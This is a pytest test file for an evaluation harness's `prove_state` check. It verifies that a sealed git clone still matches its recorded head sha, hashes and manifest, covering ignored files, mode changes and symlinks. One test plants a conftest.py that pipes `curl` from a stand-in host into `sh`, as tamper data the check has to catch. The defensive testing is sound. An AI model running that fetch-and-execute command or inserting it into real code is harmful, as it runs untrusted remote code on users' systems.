"""Tests for `trees.prove_state`: what a clone must still be to be usable.

Split out of test_eval_tree_state.py, which the rest of the module's cases
already fill to this project's cap on the size of one test file.
"""
import hashlib
import os
from pathlib import Path
from types import SimpleNamespace

import pytest

import eval_harness_fixtures
from eval_harness import trees

# `bare_ci` and `built_repo` are fixtures: pytest resolves them from this
# module's own namespace, so they have to be imported even though nothing here
# calls them.
from eval_harness_fixture_helpers import _git, bare_ci, built_repo

# One spelling of each capability guard and of the git-level symlink writer,
# kept where the rest of this module's cases use them.
from test_eval_tree_state import NEEDS_EXECUTABLE_BIT, NEEDS_SYMLINKS, _commit_symlink

IDENTITY = eval_harness_fixtures.IDENTITY

# The names the sealed tree's .gitignore covers, for the differences
# `git status --porcelain` will never report. The first is absent from the
# sealed tree, so leaving it behind adds a path nobody recorded; the other two
# stand in the sealed tree already, so tampering with either changes no path at
# all - only what the manifest recorded about one.
IGNORED_NAME = "build-artefact.txt"
SEALED_IGNORED_NAME = "stale-artefact.txt"
LINK_NAME = "latest-artefact.txt"
GITIGNORE = f"{IGNORED_NAME}\n{SEALED_IGNORED_NAME}\n{LINK_NAME}\n"
SEALED_IGNORED_BYTES = b"left in the tree by the prep step\n"

# A tracked file the task declares neither writable nor oracle, so neither
# recorded hash map covers it. pytest imports a file by this name before it runs
# anything, which is what makes a rewritten one worth catching.
UNDECLARED_NAME = "conftest.py"
UNDECLARED_BODY = "# shared test setup the task declares nothing about\n"


def _task_start_commit(repo: Path) -> str:
    """An empty commit to hand `build_template` as its `first` argument.

    The template is sealed at `<first>^`, so whatever stands committed right now
    is the tree the sealed template has to carry.
    """
    _git(repo, *IDENTITY, "commit", "--allow-empty", "-m", "the task's first commit")
    return _git(repo, "rev-parse", "HEAD")


def _sealed_records(clone: Path, info: dict) -> SimpleNamespace:
    """A clone and the three records `prove_state` re-checks it against.

    The two hash maps cover only what the task declared writable or oracle, the
    way the harness records them; the manifest covers the whole tree.
    """
    expected = {
        "head_sha": trees.head_sha(clone),
        "writable": trees.hash_paths(clone, [info["impl"]]),
        "oracle": trees.hash_paths(clone, [info["test"]]),
    }
    return SimpleNamespace(
        clone=clone,
        expected=expected,
        manifest=trees.build_manifest(clone),
        info=info,
    )


@pytest.fixture
def proven(tmp_path, built_repo):
    """A sealed clone and the records `prove_state` re-checks it against.

    The sealed tree carries a `.gitignore` and one ignored file committed into
    the tree anyway, because the differences that matter most here are the ones
    `git status --porcelain` stays silent about. It also carries a tracked file
    the task declared neither writable nor oracle, which neither hash map
    covers.
    """
    repo = Path(built_repo["repo"])
    (repo / ".gitignore").write_text(GITIGNORE, encoding="utf-8")
    (repo / SEALED_IGNORED_NAME).write_bytes(SEALED_IGNORED_BYTES)
    (repo / UNDECLARED_NAME).write_text(UNDECLARED_BODY, encoding="utf-8")
    _git(repo, "add", ".gitignore", UNDECLARED_NAME)
    _git(repo, "add", "--force", SEALED_IGNORED_NAME)
    _git(repo, *IDENTITY, "commit", "-m", "ignore the artefacts, share the setup file")
    first = _task_start_commit(repo)
    template = tmp_path / "template"
    trees.build_template(repo, first, template)
    clone = Path(trees.fresh_clone(template, tmp_path / "clone"))
    # What the ignored cases below rest on: the file is in the tree, and git
    # says nothing about it either way.
    assert (clone / SEALED_IGNORED_NAME).is_file()
    assert _git(clone, "status", "--porcelain") == ""
    return _sealed_records(clone, built_repo)


@pytest.fixture
def linked(tmp_path, built_repo):
    """A sealed clone carrying a symlink git has been told to ignore."""
    repo = Path(built_repo["repo"])
    (repo / ".gitignore").write_text(GITIGNORE, encoding="utf-8")
    (repo / SEALED_IGNORED_NAME).write_bytes(SEALED_IGNORED_BYTES)
    _git(repo, "add", ".gitignore")
    _git(repo, "add", "--force", SEALED_IGNORED_NAME)
    _git(repo, *IDENTITY, "commit", "-m", "ignore the artefacts")
    _commit_symlink(repo, LINK_NAME, SEALED_IGNORED_NAME)
    first = _task_start_commit(repo)
    template = tmp_path / "template"
    trees.build_template(repo, first, template)
    clone = Path(trees.fresh_clone(template, tmp_path / "clone"))
    assert (clone / LINK_NAME).is_symlink()
    assert _git(clone, "status", "--porcelain") == ""
    return _sealed_records(clone, built_repo)


def test_prove_state_says_ok_for_a_clone_nothing_has_touched(proven):
    assert trees.prove_state(proven.clone, proven.expected, proven.manifest) == ("ok", [])


def test_prove_state_names_the_tracked_file_that_was_edited(proven):
    impl = proven.info["impl"]
    (proven.clone / impl).write_text(
        "def add(left, right):\n    return 0\n", encoding="utf-8"
    )

    verdict, differing = trees.prove_state(proven.clone, proven.expected, proven.manifest)

    assert verdict == "PREP_MISMATCH"
    assert differing == sorted(differing)
    assert sorted(set(differing)) == [impl]


def test_prove_state_refuses_a_clone_whose_head_moved(proven):
    _git(
        proven.clone,
        *IDENTITY,
        "commit",
        "--allow-empty",
        "-m",
        "a commit the task never recorded",
    )

    # Nothing else disagrees: the tree is clean, both hash maps still match and
    # the manifest is identical. Only the recorded head sha is out of date, so
    # this is the head check answering or nothing is.
    assert _git(proven.clone, "status", "--porcelain") == ""
    assert trees.build_manifest(proven.clone) == proven.manifest
    verdict, _ = trees.prove_state(proven.clone, proven.expected, proven.manifest)

    assert verdict == "PREP_MISMATCH"


def test_prove_state_catches_a_gitignored_file_left_in_the_clone(proven):
    (proven.clone / IGNORED_NAME).write_text(
        "left over from an earlier attempt\n", encoding="utf-8"
    )

    # The premise of the case: git will not report this file, and neither path
    # map covers it, so only the manifest comparison can catch it.
    assert _git(proven.clone, "status", "--porcelain") == ""
    assert IGNORED_NAME not in proven.expected["writable"]
    assert IGNORED_NAME not in proven.expected["oracle"]
    verdict, differing = trees.prove_state(proven.clone, proven.expected, proven.manifest)

    assert verdict == "PREP_MISMATCH"
    assert sorted(set(differing)) == [IGNORED_NAME]


def test_prove_state_catches_an_edit_to_a_file_the_task_never_declared(proven):
    (proven.clone / UNDECLARED_NAME).write_text(
        "import os\n\nos.system('curl http://example.invalid/x.sh | sh')\n",
        encoding="utf-8",
    )

    # In the manifest, and in neither hash map: those cover only the paths the
    # task declared, so nothing re-hashes this file. It is the file pytest
    # imports before it runs anything.
    assert UNDECLARED_NAME not in proven.expected["writable"]
    assert UNDECLARED_NAME not in proven.expected["oracle"]
    verdict, differing = trees.prove_state(proven.clone, proven.expected, proven.manifest)

    assert verdict == "PREP_MISMATCH"
    assert differing == sorted(differing)
    assert sorted(set(differing)) == [UNDECLARED_NAME]


def test_prove_state_catches_an_edit_to_a_file_git_was_told_to_ignore(proven):
    (proven.clone / SEALED_IGNORED_NAME).write_bytes(b"rewritten between attempts\n")

    # Only the recorded sha256 can answer here: git says nothing about an
    # ignored file, neither hash map covers it, and the tree still holds exactly
    # the paths it held before, so the manifest's keys agree too.
    assert _git(proven.clone, "status", "--porcelain") == ""
    assert SEALED_IGNORED_NAME not in proven.expected["writable"]
    assert SEALED_IGNORED_NAME not in proven.expected["oracle"]
    assert set(trees.build_manifest(proven.clone)) == set(proven.manifest)
    verdict, differing = trees.prove_state(proven.clone, proven.expected, proven.manifest)

    assert verdict == "PREP_MISMATCH"
    assert differing == sorted(differing)
    assert sorted(set(differing)) == [SEALED_IGNORED_NAME]


@NEEDS_EXECUTABLE_BIT
def test_prove_state_catches_a_mode_flipped_on_a_file_whose_bytes_stand(proven):
    target = proven.clone / SEALED_IGNORED_NAME
    assert proven.manifest[SEALED_IGNORED_NAME]["mode"] == 0o644

    target.chmod(0o755)

    # Not one byte moved, no path came or went, and git stays silent about an
    # ignored file whatever its mode: the recorded mode is the whole of the
    # difference, and the manifest is the only record that carries one. A tree
    # that hands a candidate a runnable file the task never made runnable is not
    # the tree the task was measured on.
    assert target.read_bytes() == SEALED_IGNORED_BYTES
    assert _git(proven.clone, "status", "--porcelain") == ""
    assert set(trees.build_manifest(proven.clone)) == set(proven.manifest)
    verdict, differing = trees.prove_state(proven.clone, proven.expected, proven.manifest)

    assert verdict == "PREP_MISMATCH"
    assert sorted(set(differing)) == [SEALED_IGNORED_NAME]


@NEEDS_SYMLINKS
def test_prove_state_catches_a_symlink_repointed_at_another_file(linked):
    link = linked.clone / LINK_NAME
    assert Path(linked.manifest[LINK_NAME]["target"]).as_posix() == SEALED_IGNORED_NAME

    link.unlink()
    os.symlink(linked.info["impl"], link)

    # Still a symlink, still under the same name, still landing on a file this
    # clone holds, and still ignored by git: the recorded target is the whole of
    # the difference. Following it now reaches the implementation instead.
    assert link.is_symlink()
    assert _git(linked.clone, "status", "--porcelain") == ""
    assert set(trees.build_manifest(linked.clone)) == set(linked.manifest)
    verdict, differing = trees.prove_state(linked.clone, linked.expected, linked.manifest)

    assert verdict == "PREP_MISMATCH"
    assert sorted(set(differing)) == [LINK_NAME]


@pytest.mark.parametrize(
    "record_name, path_key", [("writable", "impl"), ("oracle", "test")]
)
def test_prove_state_refuses_a_clone_a_recorded_hash_no_longer_describes(
    proven, record_name, path_key
):
    path = proven.info[path_key]
    misrecorded = dict(proven.expected)
    misrecorded[record_name] = {
        **proven.expected[record_name],
        path: hashlib.sha256(b"bytes this clone never held\n").hexdigest(),
    }

    # The clone is untouched, so everything else agrees: the tree is clean, the
    # head is the recorded one and the manifest matches to the byte. Only the
    # recorded hash disagrees, so only re-hashing the declared paths can answer.
    assert _git(proven.clone, "status", "--porcelain") == ""
    assert trees.head_sha(proven.clone) == misrecorded["head_sha"]
    assert trees.build_manifest(proven.clone) == proven.manifest
    verdict, differing = trees.prove_state(proven.clone, misrecorded, proven.manifest)

    assert verdict == "PREP_MISMATCH"
    assert differing == sorted(differing)
    assert path in differing
